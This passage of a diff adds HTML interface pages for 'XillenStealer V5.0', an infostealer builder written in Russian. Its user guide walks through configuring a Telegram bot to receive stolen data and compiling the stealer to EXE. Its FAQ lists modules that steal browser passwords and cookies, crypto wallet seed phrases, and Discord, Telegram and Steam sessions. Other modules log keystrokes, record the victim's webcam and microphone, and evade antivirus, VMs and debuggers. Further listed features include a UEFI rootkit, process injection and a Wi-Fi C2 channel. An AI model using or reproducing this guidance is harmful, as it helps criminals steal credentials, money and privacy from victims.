+                      <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z"/>
+                    </svg>
+                    <span data-translate="about.modules.technical.title">Технические возможности</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.technical.persistence">Персистентность:</strong> <span data-translate="about.modules.technical.persistence.desc">Автозапуск при загрузке системы, скрытие в системе</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.uefi">UEFI руткит:</strong> <span data-translate="about.modules.technical.uefi.desc">Загрузка на уровне UEFI для максимальной скрытности</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.inject">Инжект в процессы:</strong> <span data-translate="about.modules.technical.inject.desc">Внедрение в другие процессы для обхода детекции</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.gpu">GPU память:</strong> <span data-translate="about.modules.technical.gpu.desc">Использование GPU для обработки данных</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.ebpf">eBPF хуки:</strong> <span data-translate="about.modules.technical.ebpf.desc">Перехват системных вызовов через eBPF</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.tpm">TPM модуль:</strong> <span data-translate="about.modules.technical.tpm.desc">Работа с Trusted Platform Module</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.dma">DMA атаки:</strong> <span data-translate="about.modules.technical.dma.desc">Прямой доступ к памяти через DMA</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.wifi">Wi-Fi C2:</strong> <span data-translate="about.modules.technical.wifi.desc">Командный канал через Wi-Fi</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.proxy">Облачный прокси:</strong> <span data-translate="about.modules.technical.proxy.desc">Использование облачных прокси для скрытности</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.kubernetes">Kubernetes:</strong> <span data-translate="about.modules.technical.kubernetes.desc">Работа в Kubernetes кластерах</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.technical.docker">Docker:</strong> <span data-translate="about.modules.technical.docker.desc">Контейнеризация и работа в Docker</span></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Guide Screen -->
+        <section class="card" data-view="guide">
+          <h2 data-translate="guide.title">Руководство пользователя</h2>
+          <div class="guide-content">
+            <div class="guide-section">
+              <div class="guide-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+              </div>
+              <h3 data-translate="guide.quickstart">Быстрый старт</h3>
+              <div class="guide-steps">
+                <div class="step">
+                  <div class="step-number">1</div>
+                  <div class="step-content">
+                    <h4 data-translate="guide.step1.title">Получите токен бота</h4>
+                    <p data-translate="guide.step1.desc">Создайте бота в @BotFather и получите токен</p>
+                  </div>
+                </div>
+                <div class="step">
+                  <div class="step-number">2</div>
+                  <div class="step-content">
+                    <h4 data-translate="guide.step2.title">Узнайте Chat ID</h4>
+                    <p data-translate="guide.step2.desc">Напишите боту @userinfobot для получения вашего ID</p>
+                  </div>
+                </div>
+                <div class="step">
+                  <div class="step-number">3</div>
+                  <div class="step-content">
+                    <h4 data-translate="guide.step3.title">Настройте стиллер</h4>
+                    <p data-translate="guide.step3.desc">Введите токен, Chat ID и выберите нужные модули</p>
+                  </div>
+                </div>
+                <div class="step">
+                  <div class="step-number">4</div>
+                  <div class="step-content">
+                    <h4 data-translate="guide.step4.title">Создайте и скомпилируйте</h4>
+                    <p data-translate="guide.step4.desc">Нажмите "Создать" и выберите компиляцию в EXE</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="guide-section">
+              <div class="guide-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+              </div>
+              <h3 data-translate="guide.modules.title">Настройки модулей</h3>
+              <div class="modules-guide">
+                <div class="module-category">
+                  <h4>
+                    <svg viewBox="0 0 24 24" style="width: 16px; height: 16px; margin-right: 6px; vertical-align: middle;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17h2v-2h-2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+                    <span data-translate="guide.basic.modules">Основные модули</span>
+                  </h4>
+                  <ul>
+                    <li><strong data-translate="module.browsers">Сбор браузеров</strong> - <span data-translate="guide.module.browsers.desc">пароли, куки, история</span></li>
+                    <li><strong data-translate="module.wallets">Крипто-кошельки</strong> - <span data-translate="guide.module.wallets.desc">Bitcoin, Ethereum, другие</span></li>
+                    <li><strong data-translate="module.system_info">Системная информация</strong> - <span data-translate="guide.module.system.desc">ОС, железо, сеть</span></li>
+                    <li><strong data-translate="module.screenshot">Скриншот экрана</strong> - <span data-translate="guide.module.screenshot.desc">захват рабочего стола</span></li>
+                  </ul>
+                </div>
+                <div class="module-category">
+                  <h4>
+                    <svg viewBox="0 0 24 24" style="width: 16px; height: 16px; margin-right: 6px; vertical-align: middle;"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+                    <span data-translate="guide.advanced.modules">Продвинутые модули</span>
+                  </h4>
+                  <ul>
+                    <li><strong data-translate="module.audio_record">Запись звука</strong> - <span data-translate="guide.module.audio.desc">микрофон, системные звуки</span></li>
+                    <li><strong data-translate="module.keylogger">Логи клавиатуры</strong> - <span data-translate="guide.module.keylogger.desc">кейлоггер</span></li>
+                    <li><strong data-translate="module.anti_debug">Анти-отладка</strong> - <span data-translate="guide.module.anti_debug.desc">защита от анализа</span></li>
+                    <li><strong data-translate="module.anti_vm">Анти-VM</strong> - <span data-translate="guide.module.anti_vm.desc">детект виртуальных машин</span></li>
+                  </ul>
+                </div>
+                <div class="module-category">
+                  <h4>
+                    <svg viewBox="0 0 24 24" style="width: 16px; height: 16px; margin-right: 6px; vertical-align: middle;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                    <span data-translate="guide.stealth.modules">Стелс модули</span>
+                  </h4>
+                  <ul>
+                    <li><strong data-translate="module.persistence">Персистентность</strong> - <span data-translate="guide.module.persistence.desc">автозапуск</span></li>
+                    <li><strong data-translate="module.uefi">UEFI руткит</strong> - <span data-translate="guide.module.uefi.desc">загрузочный уровень</span></li>
+                    <li><strong data-translate="module.process_inject">Инжект в процессы</strong> - <span data-translate="guide.module.process_inject.desc">скрытое выполнение</span></li>
+                    <li><strong data-translate="module.gpu_memory">GPU память</strong> - <span data-translate="guide.module.gpu.desc">анализ видеокарты</span></li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+
+            <div class="guide-section">
+              <div class="guide-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+              </div>
+              <h3 data-translate="guide.tips.title">Советы и рекомендации</h3>
+              <div class="tips-grid">
+                <div class="tip-card">
+                  <div class="tip-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                  </div>
+                  <h4 data-translate="guide.security.title">Безопасность</h4>
+                  <p data-translate="guide.security.desc">Используйте VPN и прокси для анонимности. Не запускайте на своем основном ПК.</p>
+                </div>
+                <div class="tip-card">
+                  <div class="tip-icon">
+                    <svg viewBox="0 0 24 24"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>
+                  </div>
+                  <h4 data-translate="guide.performance.title">Производительность</h4>
+                  <p data-translate="guide.performance.desc">Отключите ненужные модули для уменьшения размера файла и повышения скорости.</p>
+                </div>
+                <div class="tip-card">
+                  <div class="tip-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+                  </div>
+                  <h4 data-translate="guide.customization.title">Кастомизация</h4>
+                  <p data-translate="guide.customization.desc">Измените имя файла и настройки задержки для уникальности каждого стиллера.</p>
+                </div>
+                <div class="tip-card">
+                  <div class="tip-icon">
+                    <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+                  </div>
+                  <h4 data-translate="guide.monitoring.title">Мониторинг</h4>
+                  <p data-translate="guide.monitoring.desc">Следите за логами в Telegram для отслеживания активности стиллера.</p>
+                </div>
+              </div>
+            </div>
+
+            <div class="guide-section">
+              <div class="guide-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+              </div>
+              <h3 data-translate="guide.faq.title">Часто задаваемые вопросы</h3>
+              <div class="faq-list">
+                <div class="faq-item">
+                  <h4 data-translate="guide.faq.q1">Стиллер не запускается на Windows Defender?</h4>
+                  <p data-translate="guide.faq.a1">Добавьте исключение в антивирус или используйте модуль "Анти-отладка".</p>
+                </div>
+                <div class="faq-item">
+                  <h4 data-translate="guide.faq.q2">Как уменьшить размер EXE файла?</h4>
+                  <p data-translate="guide.faq.a2">Отключите ненужные модули и используйте UPX сжатие в PyInstaller.</p>
+                </div>
+                <div class="faq-item">
+                  <h4 data-translate="guide.faq.q3">Стиллер не отправляет данные в Telegram?</h4>
+                  <p data-translate="guide.faq.a3">Проверьте правильность токена бота и Chat ID. Убедитесь в наличии интернета.</p>
+                </div>
+                <div class="faq-item">
+                  <h4 data-translate="guide.faq.q4">Можно ли использовать на Linux/Mac?</h4>
+                  <p data-translate="guide.faq.a4">Да, но некоторые модули работают только на Windows. Проверьте совместимость.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Modules FAQ Screen -->
+        <section class="card" data-view="modules-faq">
+                          <h2 data-translate="faq.title">FAQ модулей XillenStealer V5.0</h2>
+          
+          <!-- Search Box -->
+          <div class="search-container">
+            <div class="search-box">
+              <svg class="search-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+              <input type="text" id="faqSearch" placeholder="Поиск по модулям..." data-translate-placeholder="faq.search" />
+              <button id="clearSearch" class="clear-btn" style="display: none;">
+                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+              </button>
+            </div>
+          </div>
+          
+          <div class="modules-faq-content" id="modulesFaqContent">
+            <div class="faq-category">
+              <h3>
+                <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; margin-right: 8px; vertical-align: middle;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17h2v-2h-2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+                <span data-translate="faq.category.browsers">Браузеры и пароли</span>
+              </h3>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.chrome">Chrome</h4>
+                <p data-translate="faq.module.chrome.desc">Крадет сохраненные пароли, куки и данные автозаполнения из Google Chrome</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.firefox">Firefox</h4>
+                <p data-translate="faq.module.firefox.desc">Извлекает пароли и куки из Mozilla Firefox</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.edge">Edge</h4>
+                <p data-translate="faq.module.edge.desc">Крадет данные из Microsoft Edge браузера</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.opera">Opera</h4>
+                <p data-translate="faq.module.opera.desc">Извлекает пароли и куки из Opera браузера</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.brave">Brave</h4>
+                <p data-translate="faq.module.brave.desc">Крадет данные из Brave браузера</p>
+              </div>
+            </div>
+
+            <div class="faq-category">
+              <h3>
+                <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; margin-right: 8px; vertical-align: middle;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                <span data-translate="faq.category.crypto">Криптовалюты и кошельки</span>
+              </h3>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.exodus">Exodus</h4>
+                <p data-translate="faq.module.exodus.desc">Крадет seed фразы и приватные ключи из кошелька Exodus</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.electrum">Electrum</h4>
+                <p data-translate="faq.module.electrum.desc">Извлекает данные из Bitcoin кошелька Electrum</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.atomic">Atomic</h4>
+                <p data-translate="faq.module.atomic.desc">Крадет данные из Atomic Wallet</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.coinbase">Coinbase</h4>
+                <p data-translate="faq.module.coinbase.desc">Извлекает данные из Coinbase кошелька</p>
+              </div>
+            </div>
+
+            <div class="faq-category">
+              <h3>
+                <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; margin-right: 8px; vertical-align: middle;"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                <span data-translate="faq.category.messengers">Мессенджеры и соцсети</span>
+              </h3>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.discord">Discord</h4>
+                <p data-translate="faq.module.discord.desc">Крадет токены Discord и данные аккаунта</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.telegram">Telegram</h4>
+                <p data-translate="faq.module.telegram.desc">Извлекает сессии Telegram Desktop</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.steam">Steam</h4>
+                <p data-translate="faq.module.steam.desc">Крадет Steam сессии и данные аккаунта</p>
+              </div>
+            </div>
+
+            <div class="faq-category">
+              <h3>
+                <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; margin-right: 8px; vertical-align: middle;"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                <span data-translate="faq.category.system">Система и безопасность</span>
+              </h3>
+              <div class="faq-module">
+                <h4 data-translate="module.anti_debug">Анти-отладка</h4>
+                <p data-translate="faq.module.anti_debug.desc">Защищает от отладчиков и анализа в песочнице</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="module.anti_vm">Анти-ВМ</h4>
+                <p data-translate="faq.module.anti_vm.desc">Обнаруживает виртуальные машины и завершает работу</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="module.screenshot">Скриншот</h4>
+                <p data-translate="faq.module.screenshot.desc">Делает скриншот экрана жертвы</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="module.keylogger">Кейлоггер</h4>
+                <p data-translate="faq.module.keylogger.desc">Записывает нажатия клавиш</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="module.audio_record">Микрофон</h4>
+                <p data-translate="faq.module.audio.desc">Записывает звук с микрофона</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.webcam">Веб-камера</h4>
+                <p data-translate="faq.module.webcam.desc">Делает фото с веб-камеры</p>
+              </div>
+            </div>
+
+            <div class="faq-category">
+              <h3>
+                <svg viewBox="0 0 24 24" style="width: 20px; height: 20px; margin-right: 8px; vertical-align: middle;"><path d="M10 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2h-8l-2-2z"/></svg>
+                <span data-translate="faq.category.files">Файлы и данные</span>
+              </h3>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.documents">Документы</h4>
+                <p data-translate="faq.module.documents.desc">Крадет файлы из папки Документы</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.desktop">Рабочий стол</h4>
+                <p data-translate="faq.module.desktop.desc">Извлекает файлы с рабочего стола</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="faq.module.downloads">Загрузки</h4>
+                <p data-translate="faq.module.downloads.desc">Крадет файлы из папки Загрузки</p>
+              </div>
+              <div class="faq-module">
+                <h4 data-translate="module.system_info">Системная информация</h4>
+                <p data-translate="faq.module.system_info.desc">Собирает данные о системе, процессоре, памяти</p>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script src="renderer.js"></script>
+  </body>
+</html>
